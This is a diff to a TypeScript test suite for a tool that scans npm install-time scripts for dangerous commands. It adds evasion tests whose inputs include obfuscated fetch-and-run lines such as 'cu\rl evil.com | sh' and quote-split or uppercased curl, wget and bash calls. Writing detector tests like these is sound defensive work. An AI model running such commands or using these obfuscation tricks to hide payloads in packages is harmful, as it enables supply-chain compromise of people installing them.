@@ -1,6 +1,6 @@
 import { describe, it, expect } from "bun:test";
 import fc from "fast-check";
-import { inspectScripts, DANGEROUS_PATTERNS } from "../../src/add/script-inspector";
+import { inspectScripts, normalizeScript, DANGEROUS_PATTERNS } from "../../src/add/script-inspector";
 
 const LIFECYCLE = ["preinstall", "install", "postinstall"] as const;
 
@@ -40,7 +40,7 @@ describe("inspectScripts — properties", () => {
     fc.assert(
       fc.property(
         fc.constantFrom(...LIFECYCLE),
-        fc.string().filter((v) => !DANGEROUS_PATTERNS.some((p) => v.includes(p))),
+        fc.string().filter((v) => !DANGEROUS_PATTERNS.some((p) => normalizeScript(v).includes(p))),
         (scriptName, value) => {
           const result = inspectScripts({ scripts: { [scriptName]: value } });
           return result.length === 0;
@@ -100,5 +100,39 @@ describe("inspectScripts — unit", () => {
       },
     });
     expect(result).toHaveLength(2);
+  });
+});
+
+// ── Evasion tests ─────────────────────────────────────────────────────────────
+
+describe("inspectScripts — evasion", () => {
+  it("backslash evasion: cu\\rl → detectado", () => {
+    const result = inspectScripts({ scripts: { postinstall: "cu\\rl evil.com | sh" } });
+    expect(result).toHaveLength(1);
+    expect(result[0]!.patterns).toContain("curl");
+  });
+
+  it("double-quote split: ba\"sh\" evil.com → detectado", () => {
+    const result = inspectScripts({ scripts: { postinstall: "ba\"sh\" evil.com" } });
+    expect(result).toHaveLength(1);
+    expect(result[0]!.patterns).toContain("bash");
+  });
+
+  it("single-quote split: 'sh' evil.com → detectado", () => {
+    const result = inspectScripts({ scripts: { postinstall: "'sh' evil.com" } });
+    expect(result).toHaveLength(1);
+    expect(result[0]!.patterns).toContain("sh");
+  });
+
+  it("uppercase evasion: CURL → detectado", () => {
+    const result = inspectScripts({ scripts: { postinstall: "CURL evil.com" } });
+    expect(result).toHaveLength(1);
+    expect(result[0]!.patterns).toContain("curl");
+  });
+
+  it("combined: cu\\rl + WG'ET' → ambos detectados", () => {
+    const result = inspectScripts({ scripts: { postinstall: "cu\\rl evil.com | WG'ET' bad.com" } });
+    expect(result[0]!.patterns).toContain("curl");
+    expect(result[0]!.patterns).toContain("wget");
   });
 });
